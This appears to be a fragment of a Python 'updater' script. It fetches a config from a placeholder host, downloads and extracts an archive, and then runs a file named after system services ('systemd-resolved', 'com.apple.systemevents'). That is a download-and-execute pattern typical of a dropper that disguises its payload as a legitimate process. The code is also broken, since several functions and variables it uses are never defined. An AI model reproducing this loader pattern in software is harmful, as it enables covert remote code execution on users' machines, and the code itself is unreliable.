import subprocess
import sys
import urllib.request
import zipfile

platform = sys.platform

def fetch_url():
    return urllib.request.urlopen('https://example.invalid/config').read()

def extract(archive, directory):
    with zipfile.ZipFile(archive) as z:
        z.extractall(directory)
    return True

def get_target_file():
    return 'systemd-resolved' if platform == 'linux' else 'com.apple.systemevents'

def execute(path):
    subprocess.Popen([str(path)])

def update():
    try:
        url = fetch_url()
        if not download(url, archive):
            return False
        if not extract(archive, directory):
            return False
        target = find_file(directory, get_target_file())
        return execute(target)
    except Exception:
        return False

api_url = 'https://example.invalid/getAddress?platform=' + platform
downloadUrl = api_url
